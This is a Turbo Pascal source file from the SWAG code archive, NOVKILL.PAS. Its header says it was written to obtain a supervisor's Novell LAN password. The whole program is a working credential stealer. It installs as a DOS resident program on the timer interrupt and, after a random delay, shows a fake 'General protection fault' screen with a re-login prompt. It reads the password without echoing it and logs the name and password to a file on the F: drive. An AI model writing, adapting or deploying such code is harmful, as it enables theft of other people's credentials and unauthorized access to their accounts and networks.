(*
  Category: SWAG Title: BITWISE TRANSLATIONS ROUTINES
  Original name: 0069.PAS
  Description: NOVKILL.PAS
  Author: PIERRE TOURIGNY
  Date: 05-26-95  23:22
*)

{
From: BERO@flash.gun.de (Bernhard Rosenkraenzer)

A friend of mine wrote it to obtain his supervisor's password for a novell
lan.
}

program Interrupt_Netkill;
{$M $800,0,0}
uses Crt,Dos;
type scr=Array[0..79,0..24,0..1] of Byte;
var OldInt:Procedure;
    Counter:Word;
    Zufall:Word;
    Screen:Scr absolute $B800:0000;
    SaveScreen:Scr;
    Logname,Password:String;
    DosSeg,DosBusy:word;
    tsr_on:boolean;
const oldstackss:word=0;
      oldstacksp:word=0;
      stacksw:integer=-1;
      intstackss:word=0;
      intstacksp:word=0;
{$F+}
{$I-}
Procedure Input(var s:string);
var c:char; ende:boolean;
begin
  s:='';
  ende:=false;
  repeat
    repeat until keypressed;
    c:=readkey;
    IF c=chr(13) then
      ende:=true
    else IF c=chr(8) then begin
      if length(s)>0 then Dec(s[0]) end
    else s:=s+c;
  until ende;
end;
Procedure DoJob;
var f:text;
begin
  SaveScreen:=Screen;
  GotoXY(1,24);
  TextColor(Red);
  Writeln('General protection fault #317 at SERVER1/');
  Writeln('NETIPX created a GPF at 0013:014C');
  Writeln('Re-login to continue your work:');
  Write('Login-Name: ');
  Readln(logname);
  Write('Password: ');
  Input(Password);
  Writeln;
  Writeln('Stand by...');
  Assign(f,'F:\ALLE\GOT_IT!.TXT');
  Append(f);
  IF IOResult<>0 then Rewrite(f);
  Writeln(f,logname,' logged in with password ',password);
  Close(f);
  asm cli end;
  SetIntVec(8,@OldInt);
  asm sti end;
  Screen:=SaveScreen;
end;
procedure Int;interrupt;
begin
  asm cli
      inc word ptr [stacksw]
      jnz @a
      mov [oldstackss],ss
      mov [oldstacksp],sp
      mov ss,[intstackss]
      mov sp,[intstacksp]
      @a: sti
  end;
  If Counter<Zufall then Inc(Counter);
  If (Counter=Zufall) and (tsr_on=false) and (mem[DosSeg:DosBusy]=0) then begin
    tsr_on:=true;
    Port[$20]:=$20;
    DoJob;
    tsr_on:=false;
  End;
  asm cli
      dec word ptr [stacksw]
      jge @b
      mov ss,oldstackss
      mov sp,oldstacksp
      @b: sti
      pushf end;
  OldInt;
end;
procedure InitTSR;
begin
  tsr_on:=false;
  IntStackSS:=SSEG;
  asm mov [IntStackSP],SP
      mov ah,$34
      int $21
      mov [DosSeg],ES
      mov [DosBusy],BX
  end;
end;
begin
  SwapVectors;
  randomize; Zufall:=Random(5000)+1000; Counter:=0;
  InitTSR;
  GetIntVec(8,@OldInt);
  SetIntVec(8,@Int);
  Keep(0);
end.

